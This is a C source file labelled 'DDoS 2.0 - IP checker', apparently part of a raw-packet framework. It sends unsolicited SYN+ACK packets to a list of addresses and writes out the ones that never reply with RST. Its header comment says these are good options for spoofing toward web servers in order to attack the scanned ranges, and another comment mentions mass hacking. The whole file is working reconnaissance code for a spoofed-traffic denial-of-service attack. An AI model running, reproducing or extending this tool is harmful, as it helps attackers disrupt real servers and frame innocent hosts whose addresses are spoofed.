/*
DDoS 2.0 - IP checker

This is required if you do not have time, or capabilities to filter out specific source ports on packets going through the networks being used to capture
the SEQ needed to perform attacks.

we will send SYN+ACK packets to a range obviously not expecting to be involved in a connnection... if they do not respond with RST packets
then they are good options for spoofing to web servers to attack the ranges we are scanning

*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <stdint.h>
#include <netinet/ip6.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp6.h>  
#include <arpa/inet.h>
#include <stddef.h> /* For offsetof */
#include "network.h"
#include "antisurveillance.h"
#include "packetbuilding.h"
#include "research.h"
#include "utils.h"
#include "identities.h"
#include "scripting.h"
#include "network_api.h"
#include "instructions.h"
#include <math.h>


char *tag[] = { "A1", "00", NULL };

PacketBuildInstructions *BasePacket(uint32_t src, uint32_t src_port, uint32_t dst, uint32_t dst_port, int client, int flags) {
    PacketBuildInstructions *bptr = NULL;

    if ((bptr = (PacketBuildInstructions *)calloc(1, sizeof(PacketBuildInstructions))) == NULL)
        return NULL;

    bptr->type = PACKET_TYPE_TCP;
    bptr->flags = flags;

    bptr->tcp_window_size = 1500 - (20*2+12);
    bptr->ttl = 64;

    bptr->type |= PACKET_TYPE_TCP_4 | PACKET_TYPE_IPV4;
    bptr->source_ip = client ? src : dst;
    bptr->destination_ip = client ? dst : src;
    //!!! ipv6

    bptr->destination_port = client ? dst_port : src_port;
    bptr->source_port = client ? src_port : dst_port;


    return bptr;
}


int CW_FindIP_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
    // we will use >60000 ports for scanning.. to make it quick here
    if (iptr->destination_port < 60000) return 0;

    // we only care about RST...
    if (!(iptr->flags & TCP_FLAG_RST)) return 0;

    // mark the IP as 2
    IPAddressesMark(ctx, tag[0], iptr->source_ip, NULL, 2);

    return 0;
}


int CW_FindIP_Init(AS_context *ctx) {
    int ret = -1;
    NetworkAnalysisFunctions *nptr = NULL;
    FilterInformation *flt = NULL;

    // lets prepare incoming ICMP processing for our traceroutes
    if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;

    // empty filter.. we want everything.
    //FilterPrepare(flt, 0, 0);//FILTER_PACKET_IPV4|FILTER_PACKET_TCP|FILTER_PACKET_FLAGS, TCP_FLAG_RST);


    // add into network subsystem so we receive all packets
    if (Network_AddHook(ctx, flt, &CW_FindIP_Incoming) != 1) goto end;

    ret =  1;

    end:;
    return ret;
}



int main(int argc, char *argv[]) {
    AS_context *ctx = Antisurveillance_Init(1);
    char buf[1024];
    char *sptr = NULL;
    uint32_t ip = 0;
    PacketBuildInstructions *bptr = NULL;
    OutgoingPacketQueue *optr = NULL;
    int count = 0, r_count = 0;
    int start = 0;
    uint32_t our_ip = get_local_ipv4();
    IPAddresses *ip_list = NULL;
    //int file_to_iplist(AS_context *ctx, char *filename, char *country);
    IPAddresses *webservers = NULL;
    int i = 0;

    ctx->queue_buffer_size = 1024*1024;
    ctx->queue_max_packets = 1000;

    //printf("our ip %X\n", our_ip);
    
    // fill IPAddresses structure from a file
    if (!file_to_iplist(ctx, "input_ip", tag[0])) {
        fprintf(stderr, "couldnt open input file or load IP addresses properly\n");
        exit(-1);
    }

    // prepare the function above to receive packets
    Module_Add(ctx, &CW_FindIP_Init, NULL);

    // loop randommly for each IP address sending a SYN+ACK (2nd portion of tcp/ip handshake)
    while (1) {
        // pull a new unmarked IP (we mark after 1 use)
        ip = IPv4SetRandom(ctx, tag[0], 1);
        if (ip) {
            // create packet 2 of 3 way handshake.. so the target should respond with RST if its alive
            bptr = BasePacket(our_ip, 60000 + rand()%5000, ip, 80, 1, TCP_FLAG_ACK|TCP_FLAG_SYN);
            bptr->ack = rand()%0xffffffff;
            bptr->seq = rand()%0xffffffff;
            if (bptr != NULL) {
                NetworkQueueInstructions(ctx, bptr, &optr);

                if (((++count % 100)==0) && optr) {
                    OutgoingQueueLink(ctx, optr);
                    optr = NULL;
                }
            }
        } else {
            // probably finished.. we only retry 500.. maybe make configurable for mass hacking/scans
            break;
        }
    }

    if (optr) OutgoingQueueLink(ctx, optr);

    // process packets for 3 seconds
    start = time(0);
    while(1) {
        AS_perform(ctx);
        usleep(5000);

        if ((time(0) - start) > 5) break;
    }

    // retrieve the list again (it relocks the mutex)
    if ((ip_list = (IPAddresses *)IPAddressesPtr(ctx, tag[0])) == NULL) {
        exit(-1);
    }
    
    fflush(stdout);
    // the unmarked ones are the good ones...
    for (i = 0; i < ip_list->v4_count; i++) {
        // skip ones marked with 2 (it means they responded)
        if (ip_list->v4_marker[i] == 2) continue;

        r_count++;
    }

    // done
    printf("Done. %d didnt respond, and are usable.... dumping to output_ip the usable\n", r_count);

    pthread_mutex_unlock(&ip_list->mutex);

    // dumpp all IPs with a certain marker.. in this case 1 (means they didnt respopnd and were changed to 2)
    i = iplistv4_to_file(ctx, "output_ip", tag[0], 1);
    if (!i) {
        printf("error writing output file\n");
        exit(-1);
    }

    printf("task complete\n");

    exit(0);
}